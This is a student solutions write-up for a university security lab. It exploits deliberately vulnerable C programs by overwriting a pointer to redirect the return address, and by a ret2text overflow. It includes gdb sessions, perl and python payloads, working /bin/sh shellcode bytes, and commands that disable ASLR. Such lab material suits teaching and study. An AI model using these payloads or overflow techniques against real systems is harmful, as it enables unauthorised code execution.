# Solutions TP6
> Author(s): Guillaume Everarts de Velp, Nicolas Rybowski 
> Last update: 28-03-2020

**Progress**
 - [x] [6.1 Environment Configuration](#61-environment-configuration)
 - [x] [6.2 Evading Stack Protection](#62-evading-stack-protection)
 - [ ] [6.3 Breaking ASLR](#63-breaking-aslr)

## 6.1 Environment Configuration
> This is the same at last week, but repeated so you don't forget.
> 
> On most Linux systems and with most compilers there are protections built in to prevent various exploits. For today's tutorial > we may have to turn some of these off (and back on again later).
> 
> One is the randomisation of memory segments by the Linux kernel. We can see the current value with `sudo cat /proc/sys/kernel/randomize_va_space`
> This is "2" by default on Kali Linux (and most Linux systems). To turn this off for the rest of the sessions by setting the value to "0" we can run `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
> Afterwards, confirm we have turned off memory segment randomisation with `sudo cat /proc/sys/kernel/randomize_va_space`
> 
> Note that this will be changed later in the tutorial at different times.

## 6.2 Evading Stack Protection
> In "vuln.c" is a program that has a vulnerability even when compiled with stack protection. This file can be built with: `gcc -z execstack -o vuln vuln.c`, optionally you can also include debugging information with "-g".
> 
> NOTE: we do compile with stack protection! The goal of this part of the tutorial is for you to exploit code with stack protection enabled!
> 
> We can run this program with: `./vuln AAAA BBBB` and see that we are shown some memory addresses (these are included to help you).
> 
> By examining the code we can see that there is an instance of strcpy that we can probably exploit.
> 
> The goal is to provide command line arguments that allow you to execute a shellcode (of your choice, but a simple /bin/sh one is fine including taking one from an earlier tutorial).
> 
> HINT: Use the first strcpy to overflow and change the value of where "p" points to.

### Idea :bulb:
We can see that in function *f*, an unsfae call to *strcpy* is made, copying the whole string passed in `argv[1]` in a char array of size 30.  This is a good entry point for a buffer overflow.  
We can also see that we have a pointer, `p` (initially set equal to the pointer of the array), that we use as destination for our *strcpy*.  We can then overwrite the value of this pointer with the first argument (and first call to *strcpy*) by doing an overflow on the array, and then write our interesting command wherever we want with the second argument (and second call to *strncpy*).

### Step by step :walking:
**1. Overwriting p** This is quite simple, we have done it plenty of time before, we can simply run the program with a string of more than 30 caracters.
```console
$ ./vuln `perl -e 'print "\x90"x30 . "\x42"x4'` BBBB
p=bffff2fe       -- before 1st strcpy
p=42424242       -- after 1st  strcpy
Segmentation fault
```
Of course we get a *Segmentation fault* as we try to write to the address `0x42424242` with our second *strncpy*, which is probably not a writable one.

**2. Execl arguments**  The final goal will be to change the argument passed to *execl*, to give it a command that would open a shell (`/bin/sh`).  To do this, we need to know where is this argument stored in memory.  
> From here I am not very sure of what I'm doing, there might be better way of proceeding.  

First we need to know what we are looking for, in memory the initial first argument won't be presented in convenient ascii characters but in heaxadecimal values, so let's check what those values would be (you can use any online coverter for this):
```
back_to_vul --> 62 61 63 6b 5f 74 6f 5f 76 75 6c 0d 0a
```
In gdb, we can run the file one time to fix the addresses, then disass the main function.
```console
$ (gdb) run aaa bbb
Starting program: /home/admin/SecurityClass/Tutorial-06/6.2/vuln aaa bbb
...
$ (gdb) disass main
Dump of assembler code for function main:
   ...
   0x00401290 <+45>:    push   $0x0
   0x00401292 <+47>:    lea    -0x1fa9(%ebx),%eax
   0x00401298 <+53>:    push   %eax
   0x00401299 <+54>:    lea    -0x1fa8(%ebx),%eax
   0x0040129f <+60>:    push   %eax
   0x004012a0 <+61>:    call   0x401080 <execl@plt>
   ...    
End of assembler dump.
```
We can see here the three arguments of *execl* being pushed to the stack before the call of the function, the last one being the first argument of the function (the one we have interest in).  To see what is the value pushed on the stack, we can add a breakpoint just after this last push, and see what is the value of `eax` at this moment.  By printing the content of the memory at this address, we should then find the string "back_to_vul" (in hexadecimal of course).
```console
$ (gdb) b *0x40129f
Breakpoint 1 at 0x40129f: file vuln.c, line 23.
$ (gdb) run aaa bbb
Starting program: /home/admin/SecurityClass/Tutorial-06/6.2/vuln aaa bbb
...
Breakpoint 1, 0x0040129f in main ()
$ (gdb) i r $eax
eax            0x402058            4202584
$ (gdb) x/4xw 0x402058
0x402058:       0x6b636162      0x5f6f745f      0x006c7576      0x20646e45
```
We found the address (`0x00402058`) of the string to overwrite!

**3. Overwriting execl argument**
This is where I'm stuck, the address we make our second *strncpy* write to isn't writable, so we get a SIGSEGV.  In theory we would need to simply do this:
```console
$ (gdb) run "`perl -e 'print "\x90"x30 . "\x58\x20\x40"'`" /bin/sh
Starting program: /home/admin/SecurityClass/Tutorial-06/6.2/vuln "`perl -e 'print "\x90"x30 . "\x58\x20\x40"'`" /bin/sh
p=bffff28e       -- before 1st strcpy
p=402058         -- after 1st  strcpy

Program received signal SIGSEGV, Segmentation fault.
```

### New idea :bulb: :bulb:
It seems like we can not edit the part of the memory where our "back_to_vul" is writtenn, we then need another strategy.  We know that the stack is protected by a canary, this means that we cannot do a simple buffer overflow containing shellcode as we did before.  The new idea is the following:

 - Overwrite the value of the pointer `p` so that it points to register `$eip`.
 - Overwrite the value stored in `$eip` to change the return value.
 - Make that return value point to a third argument we passed to our program, which contains our magical shellcode.
 
### Step by step :walking:
**1. Arguments** Here we are going to play with the stack of the program itself, needing to access its arguments.  This means that if we change the size of the elements we pass to the program, our stack will be modified, and the address we need to access its content too.  Therefore, I will start by giving my program all the arguments it will needs (at least the right number), and only modify the values passed themself later on.  
 - Our first argument will be very similar to what we did before, 30 characters and and address: `perl -e 'print "\x90"x30 . "\x42"x4'`.  
 - The second argument is simply an address: `perl -e 'print "\x60\x61\x62\x63"'`.  
 - The shellcode we are goind to use is the same as in the previous practical session, it can be generated and passed to the program this way: `perl -e 'print "\x90"x21 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"'`.  This our third argument.

**2. Finding $eip location in stack**  The address we want our first argument to write in `p` is the one of the return address of the function *f*.  To check find it I first checked what was the next instruction after the call to *f* in the *main* usin disass.  Then I looked up in the stack at which address is this value stored, this is the value I will need to pass in my first argument.
```console
$ (gdb) disass main
Dump of assembler code for function main:
   ...
   0x00401285 <+34>:    call   0x4011d9 <f>
   0x0040128a <+39>:    add    $0x10,%esp
   ...
End of assembler dump.
(gdb) b *main+34
Breakpoint 1 at 0x401285
$ (gdb) run `perl -e 'print "\x40"x30 . "\x42"x4 . " " . "\x60\x61\x62\x63" . " " . "\x90"x21 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"'`

Breakpoint 1, 0x00401285 in main ()
$ (gdb) disass f
Dump of assembler code for function f:
   ...
   0x004011fe <+37>:    call   0x401030 <printf@plt>
   ...
   0x00401215 <+60>:    call   0x401040 <strcpy@plt>
   ...
   0x0040122a <+81>:    call   0x401030 <printf@plt>
   ...
   0x00401243 <+106>:   call   0x401070 <strncpy@plt>
   ...
   0x00401261 <+136>:   leave  
   0x00401262 <+137>:   ret  
End of assembler dump.
$ (gdb) b *0x401215
Breakpoint 2 at 0x401215
$ (gdb) c
Continuing.
p=bffff24e       -- before 1st strcpy

Breakpoint 2, 0x00401215 in f ()
$ (gdb) x/24xw 0xbffff24e
0xbffff24e:     0x40404040      0x40404040      0x40404040      0x40404040
0xbffff25e:     0x40404040      0x40404040      0x40404040      0xf27c4040
0xbffff26e:     0x8300bfff      0x4000b7fb      0xf2980040      0xf530bfff
0xbffff27e:     0x0000bfff      0x00000000      0x00000000      0x12770000
0xbffff28e:     0xf2b00040      0x0000bfff      0x00000000      0xf7e10000
0xbffff29e:     0x8000b7df      0x8000b7fb      0x0000b7fb      0xf7e10000
$ (gdb) x/xw 0xbffff27c
0xbffff27c:     0x0040128a
```
We got our address, `0xbffff27c`.

**3. Finding arguments address** To find the arguments address, you can either print some memory blocks randomly and hope to recognize your code...  or you recompile the executable with debugging informations and you directly check the value of `argv[3]`.  For me it was in the neighbourhood of `0xbffff500`.
```console
$ (gdb) x/80xw 0xbffff51b
0xbffff51b:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff52b:     0x90909090      0xb0c03190      0x31db3146      0xeb80cdc9
0xbffff53b:     0xc0315b16      0x89074388      0x4389085b      0x8d0bb00c
0xbffff54b:     0x538d084b      0xe880cd0c      0xffffffe5      0x6e69622f
0xbffff55b:     0x4e68732f      0x41414141      0x42424242      0x45485300
0xbffff56b:     0x2f3d4c4c      0x2f6e6962      0x68736162      0x53455300
0xbffff57b:     0x4e4f4953      0x4e414d5f      0x52454741      0x636f6c3d
0xbffff58b:     0x6b2f6c61      0x3a696c61      0x6d742f40      0x492e2f70
0xbffff59b:     0x752d4543      0x2f78696e      0x2c323537      0x78696e75
0xbffff5ab:     0x6c616b2f      0x742f3a69      0x2e2f706d      0x2d454349
0xbffff5bb:     0x78696e75      0x3235372f      0x4e495700      0x49574f44
0xbffff5cb:     0x00303d44      0x415f5451      0x53454343      0x49424953
0xbffff5db:     0x5954494c      0x5800313d      0x435f4744      0x49464e4f
0xbffff5eb:     0x49445f47      0x2f3d5352      0x2f637465      0x00676478
0xbffff5fb:     0x5f474458      0x53534553      0x5f4e4f49      0x48544150
0xbffff60b:     0x726f2f3d      0x72662f67      0x65646565      0x6f746b73
0xbffff61b:     0x69442f70      0x616c7073      0x6e614d79      0x72656761
0xbffff62b:     0x7365532f      0x6e6f6973      0x44580030      0x454d5f47
0xbffff63b:     0x505f554e      0x49464552      0x66783d58      0x002d6563
0xbffff64b:     0x474e414c      0x45474155      0x5353003d      0x55415f48
```
:pushpin: **Tips** (Credit [@TGLuis](https://github.com/TGLuis)) To find the exact address in memory more easily, you can use the command find in gdb:
```console
$ (gdb) find $ebp,0xbfffffff,0x90909090
0xbffff51b
0xbffff51c
...
18 patterns found.
```

### Final solution :running:
Then we have all we need, we just have to put it all together.  The only issue remaining is that I was only able to launch the shellcode in gdb, and the shell get launched in background by gdb.  Their is a way to force gdb to follow the fork created by the programm we run (`set follow-fork-mode child`).
```console
$ (gdb) set follow-fork-mode child
$ (gdb) run `perl -e 'print "\x40"x30 . "\x7c\xf2\xff\xbf" . " " . "\x30\xf5\xff\xbf" . " " . "\x90"x21 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"'`
Starting program: /home/admin/SecurityClass/Tutorial-06/6.2/vuln `perl -e 'print "\x40"x30 . "\x7c\xf2\xff\xbf" . " " . "\x30\xf5\xff\xbf" . " " . "\x90"x21 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"'`
p=bffff24e       -- before 1st strcpy
p=bffff27c       -- after 1st  strcpy
After second strcpy ;)
process 1581 is executing new program: /usr/bin/dash
$ ls
[Detaching after fork from child process 1590]
vuln  vuln.c
$ 
[Inferior 1 (process 1581) exited normally]
```
This might not work for you as addresses might have changed.

## 6.3 Breaking ASLR
> For this section of the tutorial we will tunr address randomisation back on: `echo 2 | sudo tee /proc/sys/kernel/randomize_va_space` and we can confirm it is on with `sudo cat /proc/sys/kernel/randomize_va_space` and observing the value "2".
> 
> In "ret2text.c" you will find a program that that should be exploitable even with stack protection. You can build the program with:  `gcc -o ret2text ret2text.c`and include debugging if you want.
> 
> You should now be able to cause an overflow that allows you to jump into the secret function.
> 
> HINT: This was used as an example in the lecture with brief discussion of how to perform the exploit.
> 
> In "vulnerable.c" you will find a program that we injected shell code into when ASLR was disabled. Can you inject a shellcode into it with ASLR enable?
> 
> HINT: Some solutions were presented in the lectures, or feel free to instrument the code and learn about the behaviour on your system before exploiting it.


### Solution for `ret2text.c`

The idea of the `ret2text` exploit is to rewrite EIP with the address of a non randomized function that can be found in the text section of the binary.

When we compile the `ret2text.c` file with `gcc` as explained we run into an issue. Indeed, a simple `objdump` on the binary gives the following :

```console
000011f5 <secret>:
    11f5:       55                      push   %ebp
    11f6:       89 e5                   mov    %esp,%ebp
    11f8:       53                      push   %ebx
    11f9:       83 ec 04                sub    $0x4,%esp
    11fc:       e8 74 00 00 00          call   1275 <__x86.get_pc_thunk.ax>
    1201:       05 ff 2d 00 00          add    $0x2dff,%eax
    1206:       83 ec 0c                sub    $0xc,%esp
    1209:       8d 90 0f e0 ff ff       lea    -0x1ff1(%eax),%edx
    120f:       52                      push   %edx
    1210:       89 c3                   mov    %eax,%ebx
    1212:       e8 39 fe ff ff          call   1050 <puts@plt>
    1217:       83 c4 10                add    $0x10,%esp
    121a:       90                      nop
    121b:       8b 5d fc                mov    -0x4(%ebp),%ebx
    121e:       c9                      leave  
    121f:       c3                      ret  
```

As we observe, the non-randomized address of the `secret` function is `000011f5` which is not possible to inject into the buffer due to the NULL bytes.

By giving a try to another compiler, here `clang`, we can obtain an injectable address (`080491d0`) :

```console
080491d0 <secret>:
 80491d0:       55                      push   %ebp
 80491d1:       89 e5                   mov    %esp,%ebp
 80491d3:       83 ec 08                sub    $0x8,%esp
 80491d6:       8d 05 10 a0 04 08       lea    0x804a010,%eax
 80491dc:       89 04 24                mov    %eax,(%esp)
 80491df:       e8 4c fe ff ff          call   8049030 <printf@plt>
 80491e4:       89 45 fc                mov    %eax,-0x4(%ebp)
 80491e7:       83 c4 08                add    $0x8,%esp
 80491ea:       5d                      pop    %ebp
 80491eb:       c3                      ret    
 80491ec:       90                      nop
 80491ed:       90                      nop
 80491ee:       90                      nop
 80491ef:       90                      nop
```

The rest is the usual buffer localization and overflow, that is :

**1. Finding the buffer** We put a breakpoint on the function containing the vulnerable function in order to find the saved EBP and the saved EIP, then a breakpoint before and after the vulnerable function call in order to look at the buffer while injecting code :

```console
(gdb) disassemble main
   ...
   0x0804922a <+58>:    call   0x8049190 <public>
   0x0804922f <+63>:    xor    %eax,%eax
   ...
 End of assembler dump.
(gdb) b *0x0804922a
Breakpoint 1 at 0x804922a
(gdb) disassemble public
Dump of assembler code for function public:
   ...
   0x080491aa <+26>:    call   0x8049050 <strcpy@plt>
   0x080491af <+31>:    lea    0x804a008,%ecx
   ...
End of assembler dump.
(gdb) b *0x080491aa
Breakpoint 2 at 0x80491aa
(gdb) b *0x080491af
Breakpoint 3 at 0x80491af
```

**2. Giving a try** Here we try some injections in order to deduce the location and the size of the buffer.

```console
(gdb) r $(python -c "print('\x90'*16)")
Breakpoint 1, 0x0804922a in main ()
(gdb) i r $ebp
ebp            0xbffff2b8          0xbffff2b8
```
We know that the saved EIP will be `0x0804922f` from the first disassembly.

```console
(gdb) s
Single stepping until exit from function main,
which has no line number information.

Breakpoint 2, 0x080491aa in public ()
(gdb) x/24wx $esp
0xbffff270:     0xbffff288      0xbffff507      0xb7fb6000      0xb7fb6000
0xbffff280:     0xbffff2b8      0xbffff507      0xbffff2e4      0xbffff2b8
0xbffff290:     0xbffff2e4      0xb7fb6000      0xbffff2b8      0x0804922f
0xbffff2a0:     0xbffff507      0x00000000      0x00000000      0x00000002
0xbffff2b0:     0xbffff354      0x00000000      0x00000000      0xb7dfd7e1
0xbffff2c0:     0x00000002      0xbffff354      0xbffff360      0xbffff2e4
```

We see on the third line (before the injection) the saved EBP and the saved EIP so we found the limit of our stack frame.

```console
(gdb) c
Continuing.

Breakpoint 3, 0x080491af in public ()
(gdb) x/24wx $esp
0xbffff270:     0xbffff288      0xbffff507      0xb7fb6000      0xb7fb6000
0xbffff280:     0xbffff2b8      0xbffff507      0x90909090      0x90909090
0xbffff290:     0x90909090      0x90909090      0xbffff200      0x0804922f
0xbffff2a0:     0xbffff507      0x00000000      0x00000000      0x00000002
0xbffff2b0:     0xbffff354      0x00000000      0x00000000      0xb7dfd7e1
0xbffff2c0:     0x00000002      0xbffff354      0xbffff360      0xbffff2e4
```
By observing the buffer right after the injection we can see that it is quite small, our guess of 16 bytes was correct since we wrote the last byte of the saved EBP.
The complete injection is thus composed by a padding of 20 bytes and the address of `secret`.

**3. Exploit** Here is our complete exploit :

```console
admin@kali:~/SecurityClass/Tutorial-06/6.3$ ./ret2text $(python -c "print('\x90'*20 + '\xd0\x91\x04\x08')")
public
secret function
Segmentation fault
```

The segfault is expected since right after the execution of `secret` there is no more valid EIP on the stack so the address tried by the program will be invalid.

